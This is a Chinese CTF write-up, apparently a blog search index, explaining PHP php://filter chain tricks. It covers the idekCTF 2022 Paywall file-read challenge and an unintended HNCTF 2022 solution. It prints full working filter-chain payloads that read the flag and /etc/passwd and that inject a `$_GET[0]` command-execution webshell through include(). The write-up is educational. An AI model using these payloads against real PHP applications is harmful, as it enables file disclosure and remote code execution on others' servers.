<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>浅谈Filter链</title>
    <link href="/2023/02/07/Filter/"/>
    <url>/2023/02/07/Filter/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说起来 在HNCTF的时候就有师傅用filter链给我把一道文件包含题非预期了，一直说着研究，然后一直咕x，然后这次idek比赛就遇到了（悲</p><p>所以这篇文就小小的总结一波吧x</p><h2 id="【idekCTF-2022】Paywall-WriteUp-使用filter链构造对应字符"><a href="#【idekCTF-2022】Paywall-WriteUp-使用filter链构造对应字符" class="headerlink" title="【idekCTF 2022】Paywall_WriteUp _使用filter链构造对应字符"></a>【idekCTF 2022】Paywall_WriteUp _使用filter链构造对应字符</h2><p>那先看Paywall这道题。</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109878.png" alt="img"></p><p>附件如下：</p><p>暂时无法在飞书文档外展示此内容</p><p>题目起了之后：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109901.png" alt="img"></p><p>当你点击 All about flags的时候会提示下面的信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">Thank you <span class="hljs-keyword">for</span> your interest in The idek Times, but this article is only <span class="hljs-keyword">for</span> premium users!<br><span class="hljs-comment"># 可以看到 只有高贵的VIP才能看到 flagx</span><br></code></pre></td></tr></table></figure><p>我们点击两个连接，可以看到url的参数变化：</p><ul><li>?p&#x3D;flag</li><li>?p&#x3D;hello-world</li></ul><p>因为是白盒，所以直接审计代码：（这里就给关键部分的代码了）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-title function_ invoke__">set_include_path</span>(<span class="hljs-string">&#x27;articles/&#x27;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$article_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>], <span class="hljs-number">1</span>);<br>            <br>            <span class="hljs-comment"># 使用strpos()函数检查读取的文章内容是否以“PREMIUM”或“FREE”开头</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$article_content</span>, <span class="hljs-string">&#x27;PREMIUM&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Thank you for your interest in The idek Times, but this article is only for premium users!&#x27;</span>); <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> implement subscriptions</span><br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$article_content</span>, <span class="hljs-string">&#x27;FREE&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;article&gt;<span class="hljs-subst">$article_content</span>&lt;/article&gt;&quot;</span>;<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nothing here&#x27;</span>);<br>            &#125;<br>        &#125; <br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所以我们的思路还是比较明确，在他用<code>file_get_contents()</code> 函数从请求的文件中读取内容的时候，在flag文件的开头加一个 “FREE” 这样就能让php输出$article_content的内容。</p><p>所以这里就利用了filter链的构造，详细看这个项目：</p><p><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p><p>当然也有可以直接用来梭的脚本：</p><p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><p>原理我们稍后做阐释，这里要做的是利用filter链在包含flag的文件前生成 “FREE”关键字 让php执行</p><p><code>echo &quot;&lt;article&gt;$article_content&lt;/article&gt;&quot;;</code>从而输出包含的flag。</p><p>要注意的是，FREE的base64编码为”<code>RlJFRQ==</code>“</p><p>我们需要保证我们加入的字符和flag文件的字符能够被正常解码</p><p>即 我们得保证base64解码前 文件内容不是 (<strong>因为convert.iconv.UTF8.UTF7会消掉等号</strong>）</p><p>“<code>RlJFRQUFJFTUlVTSAtIGlkZWt7VGg0bmtfVV80X1N1YnNjUjFiMW5nX3QwX291cl9uM3dzUEhQYXBlciF9</code>“</p><p>否则你读不到flag，只会得到这个：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109036.png" alt="img"></p><p>base64的编码原理,3位一组不足的话得补&#x3D;，所以这里FREE还得补上两个字符，使得所得的base64没有”&#x3D;”.确保后面的内容解码成功。</p><p>（当然只要满足开头为FREE且flag前面为3的整数倍字符就行x）</p><p>所以构造的fitter链如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag</span><br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109954.png" alt="img"></p><p>这里的<code>&quot;\x1b$)C&quot;</code>是由<code>convert.iconv.UTF8.CSISO2022KR</code>生成，因为生成链的程序默认在尾部增加了这个，后面我们会详细讲解x</p><p>flag文件的内容是”<code>PREMIUM - idek&#123;Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!&#125;</code>“</p><h2 id="【HNCTF-2022】unf1ni3hed-web3he1-非预期-使用filter链进行RCE"><a href="#【HNCTF-2022】unf1ni3hed-web3he1-非预期-使用filter链进行RCE" class="headerlink" title="【HNCTF 2022】unf1ni3hed_web3he1 非预期 使用filter链进行RCE"></a>【HNCTF 2022】unf1ni3hed_web3he1 非预期 使用filter链进行RCE</h2><p>首先这一道题的预期解是是session反序列化，但在前期源码获取的基础上，根据 just so so 这道题的灵感加了一个t00llll.php文件来获取源码信息，该文件的源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;include_&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;使用工具的时候,要轻一点哦~&quot;</span>;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$include_</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;include_&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sess|tmp/i&#x27;</span>, <span class="hljs-variable">$include_</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;可恶涅,同样的方法怎么可能骗到本小姐两次!&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sess|tmp|index|\~|\@|flag|g|\%|\^|\&amp;|data|log/i&#x27;</span>, <span class="hljs-variable">$include_</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;呜呜呜,不可以包含这些奇奇怪怪的东西欸!!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$include_</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>该文件的本意是让选手用其读取web3he1.php的源码进行代码审计，但是过滤规则还是存在一个漏洞——即我们可以通过构造filter链直接进行RCE，详细参考的项目还是这个： <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p><p>当然由于我当时出题的时候 正则有这个规则 <code>g/i</code> 所以脚本使用的BIG编码不可行，得做一些平替。</p><p>所以需要自己去fuzz,这里提供一份我fuzz好的字典x：（嘘~）</p><p>用于包含的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]`;;<span class="hljs-comment">/* (base64 value: PD89YCRfR0VUWzBdYDs7Lyo)</span><br></code></pre></td></tr></table></figure><p>最后得到的一个 GET[0] 的 临时RCE，下面是攻击报文：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">GET /t00llll.php?include_=php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO-2022-KR.UTF16|convert.iconv.ISO-IR-139.UTF-16|convert.iconv.ISO-IR-157.ISO-IR-156|convert.iconv.WINDOWS-1258.ISO_6937|convert.iconv.KOI8-T.ISO-2022-JP-3|convert.iconv.CP874.ISO2022KR|convert.iconv.CSUNICODE.UTF-8|convert.iconv.OSF00010004.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=cat+/secret/flag HTTP/1.1</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">109.0</span>.<span class="hljs-number">0.0</span> Safari/<span class="hljs-number">537.36</span> Edg/<span class="hljs-number">109.0</span>.<span class="hljs-number">1518.52</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br></code></pre></td></tr></table></figure><p>之前就非预期的一位师傅的payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">GET /t00llll.php?include_=php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.iconv.OSF00010009.ISO2022JP2|convert.iconv.UTF16.ISO-10646/UTF-8|convert.iconv.UTF-16.UTF8|convert.iconv.ISO_8859-14:1998.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&amp;0=_RCE_</span><br></code></pre></td></tr></table></figure><h2 id="原理阐述"><a href="#原理阐述" class="headerlink" title="原理阐述"></a>原理阐述</h2><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><blockquote><p>在PHP官方文档中有下面的介绍：</p><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的<a href="http://filters.html/">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a href="http://function.readfile.html/">readfile()</a>、 <a href="http://function.file.html/">file()</a> 和 <a href="http://function.file-get-contents.html/">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>php:&#x2F;&#x2F;filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p></blockquote><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>我们下面将用到的几个：没有指定的过滤器，读过滤器，写过滤器，下面给出两种方法的示例方便理解两种方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/* 这简单等同于：</span><br><span class="hljs-comment">  readfile(&quot;http://www.example.com&quot;);</span><br><span class="hljs-comment">  实际上没有指定过滤器 */</span><br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;php://filter/resource=http://www.example.com&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/* 这会以大写字母输出 www.example.com 的全部内容 */</span><br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;php://filter/read=string.toupper/resource=http://www.example.com&quot;</span>);<br><br><span class="hljs-comment">/* 这会和以上所做的一样，但还会用 ROT13 加密。 */</span><br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;php://filter/read=string.toupper|string.rot13/resource=http://www.example.com&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/* 这会通过 rot13 过滤器筛选出字符 &quot;Hello World&quot;</span><br><span class="hljs-comment">  然后写入当前目录下的 example.txt */</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;php://filter/write=string.rot13/resource=example.txt&quot;</span>,<span class="hljs-string">&quot;Hello World&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="死亡绕过"><a href="#死亡绕过" class="headerlink" title="死亡绕过"></a>死亡绕过</h3><p>我们以这个经典的例子当作引子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-string">&quot;&lt;?php exit; ?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为exit的存在所以不管我们传入什么马，程序都会直接结束，所以我们需要想办法让<code>&lt;?php exit; ?&gt;</code>失效，在上面我们提到<code>filter</code>和它支持的<code>convert.base64</code>两个过滤器，在php中，base64的过滤器存在一定宽松性，base64编码中只包含64个可打印字符<code>(A-Za-z0-9+/=)</code>，而PHP在解码base64时，遇到不在其中的字符时，将会直接置空处理，我们可以这样理解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>] = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>仅留下合法字符串进行解码。</p><p>下面的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$strrr</span> = <span class="hljs-string">&quot;PD9wa&lt;&gt;HA&lt;&gt;gZ&lt;?X&gt;hpdDsgPz4=&quot;</span>;<span class="hljs-comment">//base64_encode &quot;&lt;?php exit; ?&gt;&quot;</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$strrr</span>);<br>    <span class="hljs-comment">#Output: &lt;?php exit; ?&gt;</span><br></code></pre></td></tr></table></figure><p>另外，在根据base64的编码原理，没有凑够4字节的倍数那么就会用&#x3D;号凑齐：</p><p>比如 <code>a</code> → <code>base64_encode</code> &#x3D; <code>&quot;YQ==&quot;</code></p><p>所以如果要让密文正确解码，则我们得保证密文的长度必须为4的倍数。</p><p>如果密文长度不是4的倍数，我们继续拿上面的例子举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$strrr</span> = <span class="hljs-string">&quot;PD9wa&lt;&gt;HA&lt;&gt;gZ&lt;?X&gt;hpdDsgPz4=&quot;</span>;<span class="hljs-comment">//base64_encode &quot;&lt;?php exit; ?&gt;&quot;</span><br><span 